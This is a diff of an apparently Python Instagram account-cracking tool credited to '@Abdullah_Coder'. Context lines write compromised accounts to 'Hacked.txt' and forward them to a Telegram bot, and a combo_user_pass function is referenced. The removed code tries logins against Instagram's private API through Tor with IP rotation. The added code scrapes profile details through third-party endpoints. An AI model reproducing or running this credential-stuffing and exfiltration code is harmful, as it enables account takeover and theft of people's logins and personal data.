@@ -80,14 +80,14 @@ def get_inf(user,passs,ask,tokin,iddd):
 By : @Abdullah_Coder
  """)
         if int(followes) > 1000:
-            print("✅ High account")
+            print("✅ Premium account")
         f = open("Hacked.txt",'a+')
         f.write(shug+"\n")
         f.close()
         if(ask == "Y" or ask == "y"):
             send_Tele(tokin,iddd,shug)
             if int(followes) > 1000:
-              send_Tele(tokin,iddd,"✅ High account")
+              send_Tele(tokin,iddd,"✅ Premium account")
         
 
         return shug
@@ -411,38 +411,29 @@ def combo_user_pass():
             
             
 def get_information():
-                user = input("--------------------------------------\nEnter username or phone or email\n--------------------------------------\n>>")
-                passs = input("--------------------------------------\nEnter password\n--------------------------------------\n>>")
-                print(white+"--------------------------------------")
-                uuid = uuid4()
-                headers = {
-                            'Host':'i.instagram.com',
-                            'Accept':'*/*',
-                            'User-Agent': User_Agent(),
-                            'Cookie':'missing', 
-                            'Accept-Encoding':'gzip, deflate', 
-                            'Accept-Language':'en-US', 
-                            'X-IG-Capabilities':'3brTvw==',
-                            'X-IG-Connection-Type':'WIFI', 
-                            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
-                data = {'uuid':uuid,
-                            'password':passs,
-                            'username':user, 
-                            'device_id':uuid, 
-                            'from_reg':'false', 
-                            '_csrftoken':'missing', 
-                            'login_attempt_countn':'0',}
-                # pro = random.choice(prox)
-                
-
-                changeip()
-
-                get = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies={'http': 'socks5://127.0.0.1:9050'}, allow_redirects=True)
-                if loginm in get.text:
-                            userQ = get.json()['logged_in_user']['username']
-                            print(green+get_inf(userQ,passs,"n","t","o"))
-                else:
-                            print(red + f"Faild login")
+        user = input("--------------------------------------\nEnter username\n--------------------------------------\n>>")
+        print(white+"--------------------------------------")
+        info = requests.get(f"https://v6vv.tk/API/info-insta-v2.php?u={user}").json()
+        bio = info["biography"]
+        followes = info["edge_followed_by"]["count"]
+        following = info["edge_follow"]["count"]
+        name = info["full_name"]
+        id = info["id"]
+        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
+        ree = re.json()
+        dat = ree['data']
+        shug = (f"""
+= = = = = = = = = = = = = = = = = =
+• name : {name}
+• username  : {user}
+• id : {id}
+• followers : {followes}
+• following  : {following}
+• Date : {dat}
+• bio : {bio}
+= = = = = = = = = = = = = = = = = =
+ """)
+        print(green+shug)
                     
 
 def main():
